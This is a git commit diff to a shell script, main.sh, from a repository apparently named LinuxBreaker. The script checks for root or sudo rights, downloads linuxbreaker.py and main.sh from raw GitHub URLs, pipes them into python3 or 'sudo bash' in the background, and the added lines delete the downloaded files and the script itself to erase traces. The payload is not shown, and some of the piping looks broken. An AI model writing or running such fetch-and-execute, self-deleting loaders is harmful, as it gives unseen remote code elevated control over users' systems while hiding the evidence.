dc1cf8be9ab82872788615f505234fdc837d28e3
User-2357 <85888218+User-2357@users.noreply.github.com>
2021-12-18 08:58:54 -0600

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,10 +1,12 @@
 #!/bin/bash
 
 if [[ $(id -u -eq 0) ]]; then
-wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/main/linuxbreaker.py -b; python3 linuxbreaker.py &
+wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/linuxbreaker.py -b | python3 &
 elif groups | grep "\<sudo\>" &> /dev/null; then
-wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &
-wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; sudo bash main.sh
-else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; python3 linuxbreaker.py &
+wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/linuxbreaker.py -b | python3 &
+wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/main.sh -b | sudo bash
+else wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch1/linuxbreaker.py -b | python3 &
 fi
 rm wget-log
+rm linuxbreaker.py
+rm main.sh
